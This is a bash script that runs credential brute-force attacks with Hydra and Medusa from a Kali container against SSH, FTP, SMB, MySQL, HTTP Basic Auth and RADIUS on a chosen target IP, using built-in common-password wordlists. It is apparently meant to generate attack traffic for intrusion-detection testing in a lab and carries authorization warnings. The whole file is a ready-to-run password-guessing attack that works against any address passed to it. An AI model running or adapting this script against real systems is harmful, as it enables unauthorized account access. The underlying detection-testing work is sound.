#!/bin/bash
# Enhanced Brute Force Attack Testing Script
# Performs comprehensive brute force attacks for IDPS testing
# WARNING: Only use in authorized lab environments

KALI_CONTAINER="pentest-kali"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
OUTPUT_DIR="/root/pentest-results"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Target configuration
TARGET_IP=${1:-"172.22.0.5"}  # Default to vulnerable Linux
SERVICE=${2:-"ssh"}  # ssh, ftp, smb, mysql, http
USERNAME=${3:-""}  # Optional: specific username to test
WORDLIST_SIZE=${4:-"small"}  # small, medium, large

echo "=========================================="
echo "Brute Force Attack Testing"
echo "Target: $TARGET_IP"
echo "Service: $SERVICE"
echo "Wordlist: $WORDLIST_SIZE"
echo "Timestamp: $TIMESTAMP"
echo "=========================================="
echo ""
echo "⚠️  WARNING: This script performs brute force attacks."
echo "   Only use in authorized lab environments!"
echo ""
read -p "Continue? (y/n) " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    exit 1
fi

# Install required tools
echo "Installing required tools..."
docker exec $KALI_CONTAINER sh -c "apt-get update -qq && apt-get install -y -qq hydra medusa ncrack john wordlists 2>&1 | grep -v '^WARNING' || true"

docker exec $KALI_CONTAINER mkdir -p $OUTPUT_DIR

# Create wordlists
echo "Preparing wordlists..."
docker exec $KALI_CONTAINER sh -c "cat > /tmp/usernames.txt <<'EOF'
admin
root
user
administrator
test
guest
demo
admin123
root123
user123
EOF
"

docker exec $KALI_CONTAINER sh -c "cat > /tmp/passwords_small.txt <<'EOF'
password
123456
admin
root
password123
admin123
root123
12345678
qwerty
letmein
EOF
"

docker exec $KALI_CONTAINER sh -c "cat > /tmp/passwords_medium.txt <<'EOF'
password
123456
admin
root
password123
admin123
root123
12345678
qwerty
letmein
welcome
monkey
1234567890
abc123
111111
dragon
master
sunshine
princess
football
shadow
michael
charlie
jennifer
jordan
superman
harley
1234567
william
baseball
trustno1
EOF
"

# Select wordlist
if [ "$WORDLIST_SIZE" = "large" ]; then
    PASSWORD_LIST="/usr/share/wordlists/rockyou.txt"
    if ! docker exec $KALI_CONTAINER test -f "$PASSWORD_LIST"; then
        echo "  ⚠ Large wordlist not found, using medium"
        PASSWORD_LIST="/tmp/passwords_medium.txt"
    fi
elif [ "$WORDLIST_SIZE" = "medium" ]; then
    PASSWORD_LIST="/tmp/passwords_medium.txt"
else
    PASSWORD_LIST="/tmp/passwords_small.txt"
fi

# Function to brute force SSH
brute_force_ssh() {
    echo ""
    echo "=== SSH Brute Force Attack ==="
    echo "Target: $TARGET_IP:22"
    
    USERNAME_LIST="/tmp/usernames.txt"
    if [ -n "$USERNAME" ]; then
        echo "$USERNAME" > /tmp/single_user.txt
        USERNAME_LIST="/tmp/single_user.txt"
        docker cp /tmp/single_user.txt ${KALI_CONTAINER}:/tmp/single_user.txt
    fi
    
    echo "  - Using Hydra..."
    docker exec $KALI_CONTAINER hydra -L "$USERNAME_LIST" -P "$PASSWORD_LIST" \
        -t 4 -v -o "${OUTPUT_DIR}/bruteforce_ssh_${TIMESTAMP}.log" \
        ssh://$TARGET_IP 2>&1 | tee "${OUTPUT_DIR}/bruteforce_ssh_${TIMESTAMP}_hydra.log"
    
    echo "  - Using Medusa..."
    docker exec $KALI_CONTAINER medusa -h $TARGET_IP -u "$USERNAME_LIST" -P "$PASSWORD_LIST" \
        -M ssh -t 4 -O "${OUTPUT_DIR}/bruteforce_ssh_${TIMESTAMP}_medusa.log" 2>&1 || true
    
    echo "  ✓ SSH brute force completed"
}

# Function to brute force FTP
brute_force_ftp() {
    echo ""
    echo "=== FTP Brute Force Attack ==="
    echo "Target: $TARGET_IP:21"
    
    USERNAME_LIST="/tmp/usernames.txt"
    if [ -n "$USERNAME" ]; then
        echo "$USERNAME" > /tmp/single_user.txt
        USERNAME_LIST="/tmp/single_user.txt"
        docker cp /tmp/single_user.txt ${KALI_CONTAINER}:/tmp/single_user.txt
    fi
    
    echo "  - Using Hydra..."
    docker exec $KALI_CONTAINER hydra -L "$USERNAME_LIST" -P "$PASSWORD_LIST" \
        -t 4 -v -o "${OUTPUT_DIR}/bruteforce_ftp_${TIMESTAMP}.log" \
        ftp://$TARGET_IP 2>&1 | tee "${OUTPUT_DIR}/bruteforce_ftp_${TIMESTAMP}_hydra.log"
    
    echo "  ✓ FTP brute force completed"
}

# Function to brute force SMB
brute_force_smb() {
    echo ""
    echo "=== SMB Brute Force Attack ==="
    echo "Target: $TARGET_IP:445"
    
    USERNAME_LIST="/tmp/usernames.txt"
    if [ -n "$USERNAME" ]; then
        echo "$USERNAME" > /tmp/single_user.txt
        USERNAME_LIST="/tmp/single_user.txt"
        docker cp /tmp/single_user.txt ${KALI_CONTAINER}:/tmp/single_user.txt
    fi
    
    echo "  - Using Hydra..."
    docker exec $KALI_CONTAINER hydra -L "$USERNAME_LIST" -P "$PASSWORD_LIST" \
        -t 4 -v -o "${OUTPUT_DIR}/bruteforce_smb_${TIMESTAMP}.log" \
        smb://$TARGET_IP 2>&1 | tee "${OUTPUT_DIR}/bruteforce_smb_${TIMESTAMP}_hydra.log"
    
    echo "  ✓ SMB brute force completed"
}

# Function to brute force MySQL
brute_force_mysql() {
    echo ""
    echo "=== MySQL Brute Force Attack ==="
    echo "Target: $TARGET_IP:3306"
    
    USERNAME_LIST="/tmp/usernames.txt"
    if [ -n "$USERNAME" ]; then
        echo "$USERNAME" > /tmp/single_user.txt
        USERNAME_LIST="/tmp/single_user.txt"
        docker cp /tmp/single_user.txt ${KALI_CONTAINER}:/tmp/single_user.txt
    fi
    
    echo "  - Using Hydra..."
    docker exec $KALI_CONTAINER hydra -L "$USERNAME_LIST" -P "$PASSWORD_LIST" \
        -t 4 -v -o "${OUTPUT_DIR}/bruteforce_mysql_${TIMESTAMP}.log" \
        mysql://$TARGET_IP 2>&1 | tee "${OUTPUT_DIR}/bruteforce_mysql_${TIMESTAMP}_hydra.log"
    
    echo "  ✓ MySQL brute force completed"
}

# Function to brute force HTTP Basic Auth
brute_force_http() {
    echo ""
    echo "=== HTTP Basic Auth Brute Force Attack ==="
    echo "Target: $TARGET_IP:80"
    
    USERNAME_LIST="/tmp/usernames.txt"
    if [ -n "$USERNAME" ]; then
        echo "$USERNAME" > /tmp/single_user.txt
        USERNAME_LIST="/tmp/single_user.txt"
        docker cp /tmp/single_user.txt ${KALI_CONTAINER}:/tmp/single_user.txt
    fi
    
    echo "  - Using Hydra..."
    docker exec $KALI_CONTAINER hydra -L "$USERNAME_LIST" -P "$PASSWORD_LIST" \
        -t 4 -v -o "${OUTPUT_DIR}/bruteforce_http_${TIMESTAMP}.log" \
        http-get://$TARGET_IP/ 2>&1 | tee "${OUTPUT_DIR}/bruteforce_http_${TIMESTAMP}_hydra.log"
    
    echo "  ✓ HTTP brute force completed"
}

# Function to brute force RADIUS
brute_force_radius() {
    echo ""
    echo "=== RADIUS Brute Force Attack ==="
    echo "Target: $TARGET_IP:1812"
    
    USERNAME_LIST="/tmp/usernames.txt"
    if [ -n "$USERNAME" ]; then
        echo "$USERNAME" > /tmp/single_user.txt
        USERNAME_LIST="/tmp/single_user.txt"
        docker cp /tmp/single_user.txt ${KALI_CONTAINER}:/tmp/single_user.txt
    fi
    
    echo "  - Using Hydra..."
    docker exec $KALI_CONTAINER hydra -P "$PASSWORD_LIST" \
        -t 4 -v -o "${OUTPUT_DIR}/bruteforce_radius_${TIMESTAMP}.log" \
        radius $TARGET_IP -l "$USERNAME_LIST" 2>&1 | tee "${OUTPUT_DIR}/bruteforce_radius_${TIMESTAMP}_hydra.log"
    
    echo "  ✓ RADIUS brute force completed"
}

# Run brute force based on service
case $SERVICE in
    ssh)
        brute_force_ssh
        ;;
    ftp)
        brute_force_ftp
        ;;
    smb)
        brute_force_smb
        ;;
    mysql)
        brute_force_mysql
        ;;
    http)
        brute_force_http
        ;;
    radius)
        brute_force_radius
        ;;
    all)
        echo "Running brute force attacks against all services..."
        brute_force_ssh
        sleep 2
        brute_force_ftp
        sleep 2
        brute_force_smb
        sleep 2
        brute_force_mysql
        sleep 2
        brute_force_http
        sleep 2
        brute_force_radius
        ;;
    *)
        echo "Unknown service: $SERVICE"
        echo "Available services: ssh, ftp, smb, mysql, http, radius, all"
        exit 1
        ;;
esac

echo ""
echo "=========================================="
echo "Brute Force Attack Testing Complete"
echo "=========================================="
echo ""
echo "Attack logs saved in Kali container:"
echo "  ${OUTPUT_DIR}/bruteforce_*_${TIMESTAMP}.log"
echo ""
echo "Next steps:"
echo "1. Analyze captured traffic: ./scripts/analyze-pcap.sh <pcap_file>"
echo "2. Review brute force patterns in PCAP analysis"
echo "3. Generate IDPS rules for brute force detection"
echo "4. Test IDPS detection capabilities"
